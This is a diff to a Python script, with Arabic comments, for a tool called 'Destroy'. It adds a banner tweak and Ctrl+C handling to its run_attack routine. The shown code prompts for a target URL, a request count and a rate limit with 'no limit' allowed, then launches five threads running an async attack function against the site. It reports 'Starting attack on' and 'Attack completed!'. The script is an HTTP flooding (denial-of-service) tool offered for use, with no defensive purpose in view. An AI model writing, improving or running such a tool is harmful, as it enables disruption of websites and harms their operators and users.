@@ -20,8 +20,9 @@ def show_tool_name():
     os.system('clear')  # مسح الشاشة قبل عرض اسم الأداة
     ascii_art = pyfiglet.figlet_format("Destroy")
     print(Fore.CYAN + ascii_art)
-    print(Fore.GREEN + "[INFO] by screen") 
-    print("=================")
+    print(Fore.GREEN + "  [INFO] by screen ")  
+    print(" ==================")
+    print()
 
 # التحقق من صحة الرابط
 def get_valid_url():
@@ -107,34 +108,38 @@ def loading_animation():
 
 # بدء الهجوم
 def run_attack():
-    show_tool_name()  # عرض اسم الأداة
-    print(Fore.MAGENTA + "[INFO] Welcome to destroy just enter url.")
-    
-    url = get_valid_url()  # التحقق من صحة الرابط
-    
-    num_requests = get_valid_number(Fore.YELLOW + "Enter the number of requests to send: ") 
-     # التحقق من عدد الطلبات
-    rate_limit = get_valid_float(Fore.YELLOW + "Enter the request rate (requests per second, 0 for no limit): ")  # التحقق من معدل الطلبات
-    
-    print(Fore.CYAN + f"\n[INFO] Starting attack on: {url}")
-    
-    # تشغيل الرسالة المتحركة في الخيط الفرعي
-    animation_thread = threading.Thread(target=loading_animation)
-    animation_thread.daemon = True  # جعل الخيط يعمل في الخلفية
-    animation_thread.start()
-    
-    threads = []
-    for _ in range(5):  # تشغيل 5 Threads
-        thread = threading.Thread(target=asyncio.run, args=(attack(url, num_requests, rate_limit),))
-        threads.append(thread)
-        thread.start()
-    
-    for thread in threads:
-        thread.join()
-    
-    # عند انتهاء الهجوم، تظهر الإحصائيات
-    display_statistics(num_requests)
-    print(Fore.GREEN + "[INFO] Attack completed!")
+    try:
+        show_tool_name()  # عرض اسم الأداة
+        print(Fore.MAGENTA + "[INFO] Welcome now just enter web url.")
+        
+        url = get_valid_url()  # التحقق من صحة الرابط
+        
+        num_requests = get_valid_number(Fore.YELLOW + "Enter the number of requests to send: ")  # التحقق من عدد الطلبات
+        rate_limit = get_valid_float(Fore.YELLOW + "Enter the request rate (requests per second, 0 for no limit): ")  # التحقق من معدل الطلبات
+        
+        print(Fore.CYAN + f"\n[INFO] Starting attack on: {url}")
+        
+        # تشغيل الرسالة المتحركة في الخيط الفرعي
+        animation_thread = threading.Thread(target=loading_animation)
+        animation_thread.daemon = True  # جعل الخيط يعمل في الخلفية
+        animation_thread.start()
+        
+        threads = []
+        for _ in range(5):  # تشغيل 5 Threads
+            thread = threading.Thread(target=asyncio.run, args=(attack(url, num_requests, rate_limit),))
+            threads.append(thread)
+            thread.start()
+        
+        for thread in threads:
+            thread.join()
+        
+        # عند انتهاء الهجوم، تظهر الإحصائيات
+        display_statistics(num_requests)
+        print(Fore.GREEN + "[INFO] Attack completed!")
+
+    except KeyboardInterrupt:
+        print(Fore.RED + "\n[INFO] Operation aborted by user. Exiting...")
+        exit(0)  # الخروج عند الضغط على Ctrl+C
 
 if __name__ == "__main__":
     run_attack()
